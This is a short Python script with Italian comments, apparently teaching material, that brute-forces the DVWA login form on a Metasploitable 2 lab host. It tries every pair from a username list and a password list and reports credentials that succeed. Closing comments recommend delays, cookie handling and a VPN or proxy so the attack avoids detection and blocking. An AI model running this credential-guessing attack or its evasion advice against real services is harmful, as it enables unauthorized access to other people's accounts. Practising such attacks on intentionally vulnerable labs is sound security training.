#Questo file è stato creato per il brute force della DVWA presente 
#all'interno della metasploitable 2 , ora andiamo a spiegare le parti
#ed il funzionamento.1 importiamo le librerie http.client e urllib.parse
#l.http client ci serve a stabilire la nostra connessione con i protocolli
#giusti,settando parametri ip porta connessione etc. 
#urllibb formatta le stringhe che andremo a scrivere in py per le pagine 
#web in modo da tradurle all'applicazione web di riferimento.

import http.client, urllib.parse

username_file = open('nomi_utenti.txt')
#definiamo variabili esterne per poter leggere i nomi utenti in un altro file
#stesso per le password, ovviamente queste devono essere nella stessa
#cartella dove lanciamo il nostro script altrimenti avremo errori
password_file = open('password.txt')
#diciamo al programma di leggere le stringhe
user_list = username_file.readlines()
pass_list = password_file.readlines()
# inizia la vera funzione , quella che ci porta e combinare per utente
# e password le varie combinazioni
for user in user_list:
    user = user.rstrip()
    for psw in pass_list:
        psw = psw.rstrip()
        print(f"provo: {user} - {psw}")
        # il target vuole questo parametro: username=dsad&password=adssd&Login=Login
        post_par = urllib.parse.urlencode({'username': user, 'password': psw, 'Login': 'Login'})
        # preparo gli headers
        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html.application/xhtml+xml"}
        # configuriamo la connessione
        conn = http.client.HTTPConnection('192.168.50.101', 80)
        conn.request("POST", "/dvwa/login.php", post_par, headers)
        # attendiamo risposta
        response = conn.getresponse()
        if(response.getheader('location').endswith("index.php")):
            print("Logged with:",user, "-", psw)

#questo è un programma fatto dal prof Paolo Rampino, tuttavia puo' essere 
# implementato in quanto la maggior parte dei brute force attack viene 
# riconosciuta subito in per la velocità di esecuzione
# si potrebbe mettere un delay e ritardare l'esecuzione da un
# tentativo all'altro, come per appolicazioni piu' sofisticate si potrebbe mettere 
# la libreria request , per la gestione dei cookies .
# un altro aspetto da valutare sarebbe utilizzare una vpn o un proxy per far 
# passare la connessione da un punto ad altro in modo da non essere bloccati
# e poter provare con piu costanza.            